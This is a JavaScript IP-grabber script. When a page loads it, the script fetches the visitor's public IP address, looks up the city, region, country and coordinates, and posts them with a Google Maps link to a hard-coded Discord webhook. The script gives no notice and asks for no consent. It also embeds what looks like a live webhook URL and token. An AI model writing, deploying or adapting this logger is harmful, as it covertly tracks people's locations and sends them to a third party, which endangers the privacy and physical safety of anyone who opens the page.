const ipifyAPI = "https://api.ipify.org?format=json";
const geoAPI = "http://ip-api.com/json/"; // API to fetch geolocation data
const webhookURL =
  "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";

function getGeorgianTime() {
  const now = new Date();
  const georgianOffset = 4; // UTC+4
  const georgianTime = new Date(
    now.getTime() + georgianOffset * 60 * 60 * 1000
  );
  return georgianTime
    .toISOString()
    .replace("T", " ")
    .replace("Z", " (Georgian Time)");
}

async function getIP() {
  try {
    const response = await fetch(ipifyAPI);
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

async function getGeolocation(ip) {
  try {
    const response = await fetch(`${geoAPI}${ip}`);
    const data = await response.json();
    if (data.status === "success") {
      return {
        city: data.city,
        region: data.regionName,
        country: data.country,
        lat: data.lat,
        lon: data.lon,
      };
    } else {
      console.error("Error fetching geolocation:", data.message);
      return null;
    }
  } catch (error) {
    console.error("Error fetching geolocation:", error);
    return null;
  }
}

async function sendToDiscord(ip, location) {
  if (!ip || !location) {
    console.error("IP or location data is null or undefined.");
    return;
  }

  const timestamp = getGeorgianTime();

  const payload = {
    content: `IP Address: ${ip}
Timestamp: ${timestamp}
Location: ${location.city}, ${location.region}, ${location.country}
Map: [Google Maps](https://www.google.com/maps?q=${location.lat},${location.lon})`,
  };

  try {
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log("IP and location sent to Discord successfully!");
    } else {
      console.error("Error sending data to Discord:", response.statusText);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

async function main() {
  const ip = await getIP();
  if (ip) {
    const location = await getGeolocation(ip);
    if (location) {
      await sendToDiscord(ip, location);
    }
  }
}

main();
